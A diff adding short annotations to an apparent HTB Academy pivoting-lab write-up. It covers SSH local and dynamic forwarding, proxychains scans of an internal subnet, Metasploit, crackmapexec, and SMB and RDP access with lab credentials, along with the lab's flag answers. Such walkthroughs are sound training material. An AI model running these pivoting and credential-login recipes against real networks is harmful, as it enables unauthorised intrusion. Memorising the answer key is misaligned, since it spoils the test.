@@ -37,6 +37,7 @@ We want to talk to MySQL from our attack box without first SSH-ing into the pivo
 ```bash
 nmap -sT -p22,3306 10.129.202.64
 ```
+> TCP-connect scan to confirm SSH is open and MySQL is localhost-only on the pivot; swap the IP and ports.
 
 ```
 PORT     STATE  SERVICE
@@ -49,6 +50,7 @@ PORT     STATE  SERVICE
 ```bash
 ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
 ```
+> Local forward: binds local `127.0.0.1:1234` to the pivot's `localhost:3306`; swap local port, target host:port, and `ubuntu@PIVOT`.
 
 This says: *"SSH server, every byte hitting `127.0.0.1:1234` on my box, deliver to `localhost:3306` from your perspective."*
 
@@ -61,6 +63,7 @@ netstat -antp | grep 1234
 nmap -v -sV -p1234 localhost
 # 1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
 ```
+> Confirms the forward is listening locally and the remote MySQL is reachable on it; swap the local port `1234`.
 
 The `mysql` service appears local to us — connect with `mysql -h 127.0.0.1 -P 1234`, run exploits, etc.
 
@@ -69,6 +72,7 @@ The `mysql` service appears local to us — connect with `mysql -h 127.0.0.1 -P 
 ```bash
 ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
 ```
+> Two local forwards in one SSH session (MySQL and Apache); add/replace `-L lport:host:rport` pairs and `ubuntu@PIVOT`.
 
 `localhost:80` (Apache on the pivot) is now reachable at `http://127.0.0.1:8080` on our attack box.
 
@@ -87,6 +91,7 @@ Common headless one-liner:
 ```bash
 ssh -fNT -L 1234:localhost:3306 ubuntu@10.129.202.64
 ```
+> Headless backgrounded local forward (no shell/TTY); swap port mapping and `ubuntu@PIVOT`.
 
 ---
 
@@ -97,6 +102,7 @@ Once on the pivot, inventory interfaces:
 ```bash
 ifconfig         # or:  ip -br a
 ```
+> Inventories the pivot's NICs to find the second internal-facing interface; run as-is on the pivot.
 
 ```
 ens192:  inet 10.129.202.64   <- network back to us
@@ -128,6 +134,7 @@ SOCKS bypasses firewall/segmentation by terminating the user's traffic on the pr
 ```bash
 ssh -D 9050 ubuntu@10.129.202.64
 ```
+> Dynamic forward: turns local `127.0.0.1:9050` into a SOCKS proxy through the pivot; swap the port and `ubuntu@PIVOT`.
 
 This makes our local `127.0.0.1:9050` a **SOCKS server** that ships every connection over SSH to the pivot, which then dials the requested destination from inside the internal network.
 
@@ -141,6 +148,7 @@ tail -4 /etc/proxychains.conf
 # defaults set to "tor"
 socks4  127.0.0.1 9050
 ```
+> Shows the active proxychains chain line so you can confirm the SOCKS port; on Kali use `/etc/proxychains4.conf` and adjust the port.
 
 Add `socks5 127.0.0.1 9050` if your tunnel is SOCKS5 (Chisel/Ligolo speak SOCKS5; SSH `-D` is SOCKS5 capable too — proxychains auto-handles both with the right config line). Standard config flags:
 
@@ -163,6 +171,7 @@ proxychains nmap -v -sn 172.16.5.1-200
 # Single-host TCP connect scan (pin the host with -Pn; ICMP doesn't tunnel)
 proxychains nmap -v -Pn -sT 172.16.5.19
 ```
+> Sweeps/scans the internal subnet through the SOCKS tunnel (always `-Pn -sT`); swap the IP range/host.
 
 Output shows the SOCKS chain in use:
 
@@ -190,6 +199,7 @@ Run msfconsole through proxychains so its modules use the same tunnel:
 ```bash
 proxychains msfconsole
 ```
+> Launches Metasploit so its modules route through the same SOCKS tunnel; run as-is once the tunnel is up.
 
 ```
 msf6 > search rdp_scanner
@@ -208,6 +218,7 @@ msf6 > run
 ```bash
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /cert:ignore /dynamic-resolution
 ```
+> RDP to the internal host through the SOCKS tunnel; swap `/v:` target IP and `/u:`/`/p:` credentials.
 
 Lab creds for this section: `victor : pass@123`. Accept the cert prompt and you get a desktop session pivoted through the Ubuntu server.
 
@@ -236,6 +247,7 @@ proxychains smbclient -L //172.16.5.19/ -U user
 proxychains crackmapexec smb 172.16.5.0/23 -u U -p P
 proxychains curl http://172.16.5.19/
 ```
+> Copy-paste SSH forward and proxychains recipes; swap `PIVOT`, ports, target IPs, and `USER`/`PASS`.
 
 ---
 
@@ -269,6 +281,7 @@ sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.91
 # ens192  UP       10.129.91.231/16   <- external (our VPN side)
 # ens224  UP       172.16.5.129/23    <- internal pivot subnet
 ```
+> Non-interactive SSH (sshpass) to dump the pivot's NICs in one shot; swap the password, `ubuntu@IP`.
 
 ### Q2 — Flag from `victor`'s Desktop on `172.16.5.19` → **`N1c3Piv0t`**
 
@@ -304,6 +317,7 @@ proxychains4 -q smbclient //172.16.5.19/C$ -U 'victor%pass@123' \
 # 6. Tear down the tunnel when finished
 pkill -f 'ssh -fNT.*9050'
 ```
+> Full lab chain: open SOCKS tunnel, verify it, scan, grab the flag over SMB, then tear down; swap password, `ubuntu@IP`, target IP, and creds.
 
 Alternative (GUI) instead of step 5:
 
@@ -312,6 +326,7 @@ proxychains4 xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' \
     /cert:ignore /dynamic-resolution
 # read flag.txt.txt off the desktop
 ```
+> GUI alternative: RDP to the internal host through the tunnel to read the flag; swap `/v:` IP and `/u:`/`/p:` creds.
 
 ### Lessons learned this lab
 
